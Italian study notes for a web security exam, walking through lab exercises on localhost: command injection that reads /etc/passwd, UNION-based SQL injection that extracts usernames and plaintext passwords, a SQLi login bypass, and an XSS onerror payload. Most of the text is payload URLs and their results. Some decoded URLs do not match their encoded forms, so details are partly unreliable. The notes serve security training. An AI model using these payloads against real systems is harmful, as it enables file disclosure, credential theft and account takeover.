ESERCIZI ESAME WEB SECURITY

-> web_ce.py-----------------------
basta scrivere il seguente url per poter visualizzare il file /etc/passwd:
http://localhost:8081/?domain=www.ulisse.unibo.it%20||%20more%20/etc/passw[d]

-> web_ce1.py---------------------
come sopra pero se si vuole scrivere in maniera normale basta scrivere:
http://localhost:8000/?domain=www.ulisse.unibo.it || more /etc/passw[d]

-> web_sqli_union.py--------------
sapendo dopo aver provato una sql sbagliata, che la query effettuata Ã¨ la seguente: 
SELECT id, usarname, name, surname FROM utonti WHERE id=" + params["id"]

da qui possiamo capire che si hanno 4 colonne (non c'e bisogno di usare la tecnica dei null) e quindi possiamo attuare le seguenti due sqli:

1. per enumerare tabelle e colonne: 
http://localhost:8000/?id=1%20UNION%20SELECT%201,%20table_name,%20column_number,%20column_names%20FROM%20sqlite3_master--

(http://localhost:8000/?id=1 UNION SELECT 1, table_name, column_number, column_names FROM sqlite3_master--)

Result(s):
id	username	name	surname
1	admin	admin	admin
1	utonti	4	usarname&name&surname&passweerd

 2. per estrarre le credenziali degli utenti
 
 
 
 1. per enumerare le tabelle nel db:
 http://localhost:8000/?id=1%20UNION%20SELECT%201,%20table_name,%203,%204%20FROM%20sqlite3_master--

(http://localhost:8000/?id=1 UNION SELECT 1, table_name, 3, 4 FROM sqlite3_master--)
 
 Result(s):
id	username	name	surname
1	admin	admin	admin
1	utonti	3	4

2. per scoprire le colonne delle tabelle:
http://localhost:8000/?id=1%20UNION%20SELECT%201,%20column_names,%203,%204%20FROM%20sqlite3_master%20WHERE%20table_name=%27utonti%27--

(http://localhost:8000/?id=1 UNION SELECT 1, table_name, 3, 4 FROM sqlite3_master WHERE table_name = 'utonti' --)

Result(s):
id	username	name	surname
1	admin	admin	admin
1	usarname&name&surname&passweerd	3	4

3. per estrarre le credenziali degli utenti:
http://localhost:8000/?id=1%20UNION%20SELECT%20id,%20usarname,%20name,%20passweerd%20FROM%20utonti%20WHERE%20usarname=%27admin%27%20OR%20usarname=%27sandra%20varga%27--

(http://localhost:8000/?id=1 UNION SELECT id, usarname, name, passweerd FROM utonti WHERE username='admin' OR username='sandra' --) 

Result(s):
id	username	name	surname
1	admin	admin	7en8aiDoh!
1	admin	admin	admin

dato che con l'url di prima troviamo solo admin allora proviamo a scrivere in questo modo:
http://localhost:8000/?id=1%20UNION%20SELECT%20id,%20usarname,%20name,%20passweerd%20FROM%20utonti--

(http://localhost:8000/?id=1 UNION SELECT id, usarname, name, passweerd FROM utonti--)

Result(s):
id	username	name	surname
1	admin	admin	7en8aiDoh!
1	admin	admin	admin
2	dricci	dian	12345
3	amason	anthony	gandalf
4	svargas	sandra	phest1945

-> web_sqli.py
http://localhost:8000/login?username=&password=' oR 1 --

-> web_xss
basta inserire nel form la seguente linea di codice js:
" onerror="alert('xss')

NB: ricordarsi di intercambiare il tipo di virgolette usate.
